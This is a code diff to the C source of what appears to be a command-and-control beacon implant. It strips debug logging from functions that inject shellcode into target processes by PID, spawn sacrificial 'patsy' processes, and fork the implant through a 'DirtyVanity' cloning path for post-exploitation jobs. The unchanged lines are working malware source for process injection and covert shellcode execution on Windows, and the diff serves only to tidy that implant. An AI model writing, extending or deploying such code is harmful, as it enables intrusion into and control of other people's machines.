@@ -5,7 +5,6 @@
 #include "syscalls.h"
 #include <stdio.h>
 #include <windows.h>
-#include "spawn_trace.h"
 #include "beacon.h"
 #include "commands.h"
 #include "parse.h"
@@ -19,7 +18,6 @@
 
 /* inject some shellcode... enclosed stuff is the shellcode y0 */
 void command_inject_pid(char * buffer, int length, BOOL x86) {
-	spawn_log("inject_pid: entry len=", (long)length);
 
 	HANDLE hProcess = NULL;
 	DWORD  pid;
@@ -78,22 +76,17 @@ void command_inject(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
 
 	/* 4.12 DirtyVanity: clone ourselves instead of a patsy when configured */
 	if (procinj_execute_has(PI_EXEC_DIRTYVANITY)) {
-		spawn_log("inject: dirtyvanity fork", 0x7fffffff);
 		if (inject_dirtyvanity_forkrun(buffer, length, 0, NULL, 0)) {
 			token_guard_stop_maybe(ignoreToken);
 			return;
 		}
-		spawn_log("inject: dirtyvanity clone failed, patsy fallback", 0x7fffffff);
 	}
 
 	/* spawn our process */
-	spawn_log("inject: calling spawn_patsy x86=", (long)x86);
 	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
-		spawn_log("inject: spawn_patsy FAILED", 0x7fffffff);
 		token_guard_stop_maybe(ignoreToken);
 		return;
 	}
-	spawn_log("inject: spawn_patsy ok pid=", (long)pi.dwProcessId);
 
 	/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
 	Sleep(100);
@@ -271,12 +264,10 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 	 * instead of a patsy - no pipe/job tracking on this path, the clone
 	 * beacon reports through its own channel */
 	if (procinj_execute_has(PI_EXEC_DIRTYVANITY)) {
-		spawn_log("jobspawn: dirtyvanity fork offset=", (long)offset);
 		if (inject_dirtyvanity_forkrun(shellcode, slen, (int)offset, parameter, plen)) {
 			token_guard_stop_maybe(ignoreToken);
 			return;
 		}
-		spawn_log("jobspawn: dirtyvanity failed, patsy fallback", 0x7fffffff);
 	}
 
 	/* do our spawn logic, please! */
@@ -361,7 +352,6 @@ void command_job_spawn(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
  * exactly the Postex Kit contract. Job registration still arrives as a
  * separate COMMAND_JOB_REGISTER(_MSGMODE) task like every other postex job. */
 void command_job_spawn_user(char * buffer, int length, BOOL x86) {
-	spawn_log("job_spawn_user: entry len=", (long)length);
 	datap   parser;
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
